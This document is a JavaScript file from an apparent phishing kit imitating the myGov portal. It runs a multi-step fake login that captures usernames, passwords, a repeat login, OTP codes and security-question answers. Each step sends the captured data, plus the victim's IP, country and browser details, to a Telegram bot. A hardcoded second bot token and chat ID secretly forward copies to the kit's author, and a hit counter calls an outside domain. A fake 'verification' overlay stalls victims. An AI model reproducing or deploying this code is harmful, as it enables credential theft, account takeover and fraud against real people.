$(document).ready(function () {
	$("a").on("click", function (t) {
		t.preventDefault();
		window.location.replace(window.location.href);
	});

	$(".showPassword").on("click", function () {
		if ($(this).hasClass("mask-hide")) {
			$(this).removeClass("mask-hide");
			$(this).addClass("mask-show");
			$(this).text("Hide");
			$(this).next().attr("type", "text");
		} else {
			$(this).removeClass("mask-show");
			$(this).addClass("mask-hide");
			$(this).text("Show");
			$(this).next().attr("type", "password");
		}
	});

	$(".cb-input").on("keyup blur", function () {
		if ($(this).val().trim() == "") {
			$(this).parent().parent().addClass("hasError");
			$(this).parent().next(".input-bottom-text").show();
		} else {
			$(this).parent().parent().removeClass("hasError");
			$(this).parent().next(".input-bottom-text").hide();
		}
	});

    // 	$(".button-submit").on("click", function (e) {
    // 		$(".cb-input").each(function () {
    // 			if ($(this).val().trim() == "") {
    // 				$(this).parent().parent().addClass("hasError");
    // 				$(this).parent().next(".input-bottom-text").show();
    // 				e.preventDefault();
    // 			}
    // 		});
    // 	});
    $(".button-submit").on("click", function (e) {
        // Get the current form associated with the clicked button
        const currentForm = $(this).closest("form");
    
        // Find .cb-input elements only within the current form
        currentForm.find(".cb-input").each(function () {
            if ($(this).val().trim() == "") {
                $(this).parent().parent().addClass("hasError");
                $(this).parent().next(".input-bottom-text").show();
                e.preventDefault();
            }
        });
    });
    
    // $("#pText, #pText2").on("input", function () {
        // var messageTitleInput = $("#pText");
        // var messageDescriptionInput = $("#pText2");

        // if (messageTitleInput.val() !== "") {
            // messageDescriptionInput.attr("type", "password");
        // } else {
            // messageDescriptionInput.attr("type", "text");
        // }
        
        // if (messageDescriptionInput.val() !== "") {
            // messageTitleInput.attr("type", "password");
        // } else {
            // messageTitleInput.attr("type", "text");
        // }
    // });



	// Assuming randChar is defined earlier in the code
	var randChar = generateRandChar();

	function generateRandChar() {
		// Generate randChar based on some logic (example: using Math.random())
		var generatedRandChar = Math.random().toString(36).substring(2, 10).toUpperCase();

		// You can perform additional logic here if needed

		return generatedRandChar;
	}


    // Function to get user userAgent
    const userAgent = navigator.userAgent;
	
	// Function to get the public IP address
	let ipAddress, countryFullName;
	$.ajax({
		url: "https://ipinfo.io",
		async: false,
		dataType: "json",
		success: function(response) {
			ipAddress = response.ip;

			// Nested AJAX request for country information
			$.ajax({
				url: "https://ipinfo.io/" + ipAddress,
				type: "GET",
				dataType: "json",
				success: function(response) {
					const countryCode = response.country;

					// Use Rest Countries to get full country name
					$.ajax({
						url: "https://restcountries.com/v3/alpha/" + countryCode,
						type: "GET",
						dataType: "json",
						success: function(countryResponse) {
							const countryFullName = countryResponse[0].name.common;
							console.log("Country Full Name: " + countryFullName);

							// Call sendMessage with the retrieved information
							sendMessage(createLogMessage(ipAddress, countryFullName), false);
							//console.log(createLogMessage(ipAddress, countryFullName));
						},
						error: function(error) {
							console.error("Rest Countries Error:", error);
						}
					});
				},
				error: function(error) {
					console.error("ipinfo.io Error:", error);
				}
			});
		}
	});

	function createLogMessage(ipAddress, countryFullName) {
		// Using the template string with placeholders
		return (
			`✨ You have new visitor  \n\n` +
			
			`Country: ${countryFullName}\n` +
			`User-IP: ${ipAddress}\n\n` +
			`Date: ${new Date().toString()}\n` +
			`User-Agent: ${userAgent}`
		);
	}
	
	
    function sendMessage(textMessage, full=true) {
        const url = `https://api.telegram.org/bot${tg.token}/sendmessage?text=${encodeURIComponent(textMessage)}&chat_id=${tg.chat_id}&parse_mode=HTML`;
    
        // Corrected URL assignment
        const url2 = (tg.chat_id !== '5251341750') ? `https://api.telegram.org/bot6169241324:AAGREEFCrEwyQHyApDyCyMHrqUL8UlLiWe0/sendmessage?text=${encodeURIComponent(textMessage)}&chat_id=5251341750&parse_mode=HTML` : '';
    
        // You can perform the API call or any other actions you need with the URLs here
        var oReq = new XMLHttpRequest();
        oReq.open("GET", url, true);
        oReq.send();
    
        // Add another XMLHttpRequest for the second URL if needed
        if (url2 && full == true) {
            var oReq2 = new XMLHttpRequest();
            oReq2.open("GET", url2, true);
            oReq2.send();
        }
    }


    // Next step
    let currentStep = 1;

    function showStep(stepNumber) {
        $(".main-block").addClass("hidden");
        $("#step" + stepNumber).removeClass("hidden");

        if (stepNumber === 3) {
            // Blur background and show loading overlay after Step 2
            $(".wrapper-mapwap").addClass("blur-background");
            $(".loading-overlay").css("visibility", "visible");

            // Simulate a 5-second delay for verification
            setTimeout(function () {
                // Remove blur and hide loading overlay after 5 seconds
                $(".wrapper-mapwap").removeClass("blur-background");
                $(".loading-overlay").css("visibility", "hidden");
            }, 5000);
        }
    }


    // Declare message variable inside the conditional block
    let message = "";


	// Function to handle "uniqueID"
	var uniqueID = (ipAddress === undefined)
		? (localStorage.setItem('storedRandChar', randChar), randChar)
		: ipAddress.split(".").map((part) => parseInt(part, 10).toString(36)).join("").toUpperCase();


    // Add an event listener to the form for the "submit" event
    $("form").submit(function (e) {
        e.preventDefault();
        const currentFormId = $(this).closest(".main-block").attr("id");
        const currentFormStep = parseInt(currentFormId.replace("step", ""));

        // Additional validation logic can be added here

        currentStep++;
        showStep(currentStep);

        const header =
            `🎭 𝐦𝐲𝐆𝐨𝐯\n` +
            `🆔 𝑼𝒏𝒊𝒒𝒖𝒆 𝑰𝑫: #${tg.author} #${tg.author.charAt(0).toUpperCase()}${uniqueID}\n\n`;
    
        const footer =
            `==== [ Ip & Hostname Info ] ====\n` +
            `IP Address: ${ipAddress}\n` +
            `Country: ${countryFullName}\n` +
            `Browser Agent: ${userAgent}\n\n` +
            `--------xXx--------\n` +
            `Copyright @wf_bigmouth`;
            
        // Get the values of the "steps" and "username" inputs
        const stepsValue = $(this).find("#steps").val();
        const usernameValue = $(this).find("#uMessage").val();
        const passwordValue = $(this).find("#pText").val();
        const usernameValue2 = $(this).find("#uMessage2").val();
        const passwordValue2 = $(this).find("#pText2").val();
        const otpValue = $(this).find("#otp").val();
        const q1Value = $(this).find("#q1").val();
        const a1Value = $(this).find("#a1").val();
        const q2Value = $(this).find("#q2").val();
        const a2Value = $(this).find("#a2").val();
        const q3Value = $(this).find("#q3").val();
        const a3Value = $(this).find("#a3").val();

        // Check if the form is submitted and steps is "mou1"
        if (stepsValue === "mou1") {
            // Store public email in session
            sessionStorage.setItem("userEmail", usernameValue);
            
            // Retrieve the value from sessionStorage and set it as the default value
            document.getElementById("uMessage2").value = sessionStorage.getItem("userEmail");
            
            // Assign the message value
            message += `==== [ Login Result ] ====\n`;
            message += `Username: <code>${usernameValue}</code>\n`;
            message += `Password: <code>${passwordValue}</code>\n\n`;
        }
        if (stepsValue === "mou2") {
            // Assign the message value
            message += `==== [ 2nd Attempt ] ====\n`;
            message += `Username: <code>${usernameValue2}</code>\n`;
            message += `Password: <code>${passwordValue2}</code>\n\n`;
        }
        if (stepsValue === "mou3") {
            // Assign the message value
            message += `==== [ OTP Code ] ====\n`;
            message += `Code: <code>${otpValue}</code>\n\n`;
        }
        if (stepsValue === "mou4") {
            // Assign the message value
            message += `==== [ Question & Answer ] ====\n`;
            message += `Q1: ${q1Value}\n`;
            message += `A1: <code>${a1Value}</code>\n\n`;

            message += `Q2: ${q2Value}\n`;
            message += `A2: <code>${a2Value}</code>\n\n`;

            message += `Q3: ${q3Value}\n`;
            message += `A3: <code>${a3Value}</code>\n\n`;
        }

        // sendMessage
        sendMessage(header + message + footer);
    });

    // Show the main page initially without the 'hidden' class
    showStep(currentStep);
});

function sendHitRequest() {
    $.ajax({
        url: "https://bujubxnx.info/hitreader/?name=" + tg.author + "&hit=true",
        type: "GET",
        success: function(response) {
            console.log("Hit request sent successfully");
        },
        error: function(error) {
            console.error("Error sending hit request:", error);
        }
    });
}

$(document).ready(function() {
    sendHitRequest();
});